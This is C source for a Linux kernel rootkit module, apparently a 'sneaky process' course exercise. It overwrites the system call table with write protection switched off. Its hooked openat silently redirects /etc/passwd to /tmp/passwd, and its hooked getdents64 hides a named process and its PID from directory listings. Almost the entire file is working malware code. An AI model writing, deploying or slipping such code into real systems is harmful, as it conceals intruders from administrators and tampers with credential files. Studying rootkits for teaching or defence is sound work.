#include <linux/module.h>      // for all modules 
#include <linux/init.h>        // for entry/exit macros 
#include <linux/kernel.h>      // for printk and other kernel bits 
#include <asm/current.h>       // process information
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <asm/unistd.h>        // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>
#include <linux/uaccess.h>
#include <linux/dirent.h>

#define PREFIX "sneaky_process"

// for hiding the pid
static int sneaky_pid = 0;
module_param(sneaky_pid, int, 0);
MODULE_PARM_DESC(sneaky_pid, "PID of the sneaky process");

//This is a pointer to the system call table
static unsigned long *sys_call_table;
// static int sneaky_pid = 0;
// module_param(sneaky_pid, int, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
// MODULE_PARM_DESC(sneaky_pid, "Process ID of the sneaky process");

// Helper functions, turn on and off the PTE address protection mode
// for syscall_table pointer
int enable_page_rw(void *ptr){
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long) ptr, &level);
  if(pte->pte &~_PAGE_RW){
    pte->pte |=_PAGE_RW;
  }
  return 0;
}

int disable_page_rw(void *ptr){
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long) ptr, &level);
  pte->pte = pte->pte &~_PAGE_RW;
  return 0;
}

// 1. Function pointer will be used to save address of the original 'openat' syscall.
// 2. The asmlinkage keyword is a GCC #define that indicates this function
//    should expect it find its arguments on the stack (not in registers).

/*                             openat                               */
asmlinkage int (*original_openat)(struct pt_regs *);
// Define your new sneaky version of the 'openat' syscall
asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
{
  // Implement the sneaky part here
  char * original_path = (char *)regs->si;
  // char original_path[256];

  // if (strncpy_from_user(original_path, user_path, sizeof(original_path)) < 0) {
  //   return -EFAULT;
  // }

  // check if the path is exactly /etc/passwd
  if (strcmp(original_path, "/etc/passwd") == 0) {
      const char * tmp_path = "/tmp/passwd";

      // replace with the path to the original pwd file
      copy_to_user(original_path, tmp_path, strlen(tmp_path));
  }

  return (*original_openat)(regs);
}


/*                             getdents64                               */
// struct linux_dirent64 {
//     u64        d_ino;
//     s64        d_off;
//     unsigned short d_reclen;
//     unsigned char  d_type;
//     char       d_name[];
// };

asmlinkage int (*original_getdents64)(struct pt_regs *);

asmlinkage int sneaky_sys_getdents64(struct pt_regs * regs)
{
  // stop and redefine the sys call of original_getdents64
  struct linux_dirent64 * dirp = (struct linux_dirent64 *)regs->si;
  char pid_str[10];
  struct linux_dirent64 * d;
  int bpos = 0;
  int nread; 
  // find pid
  snprintf(pid_str, sizeof(pid_str), "%d", sneaky_pid);

  // call the original getdents64
  nread = original_getdents64(regs);
  if (nread <= 0) {
    return nread;
  }

  // use loop to check and hide the pid of sneaky process
  for (; bpos < nread;) {
    d = (struct linux_dirent64 *)((char *)dirp + bpos);
    if (strcmp(d->d_name, "sneaky_process") == 0 || strcmp(d->d_name, pid_str) == 0) {
      int reclen = d->d_reclen;
      memmove(d, (char *)d + reclen, nread - bpos - reclen);
      nread -= reclen;
    }
    else {
      bpos += d->d_reclen;
    }
  }

  // return (*original_getdents64)(regs);
  return nread;
}

// The code that gets executed when the module is loaded
static int initialize_sneaky_module(void)
{
  // See /var/log/syslog or use `dmesg` for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");

  // Lookup the address for this symbol. Returns 0 if not found.
  // This address will change after rebooting due to protection
  sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");

  // This is the magic! Save away the original 'openat' system call
  // function address. Then overwrite its address in the system call
  // table with the function address of our new code.
  original_openat = (void *)sys_call_table[__NR_openat];
  original_getdents64 = (void *)sys_call_table[__NR_getdents64];
  
  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);
  
  sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
  sys_call_table[__NR_getdents64] = (unsigned long)sneaky_sys_getdents64;

  // You need to replace other system calls you need to hack here
  
  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);

  return 0;       // to show a successful load 
}  


static void exit_sneaky_module(void) 
{
  printk(KERN_INFO "Sneaky module being unloaded.\n"); 

  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);

  // This is more magic! Restore the original 'open' system call
  // function address. Will look like malicious code was never there!
  sys_call_table[__NR_openat] = (unsigned long)original_openat;
  sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;

  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);  
}  


module_init(initialize_sneaky_module);  // what's called upon loading 
module_exit(exit_sneaky_module);        // what's called upon unloading  
MODULE_LICENSE("GPL");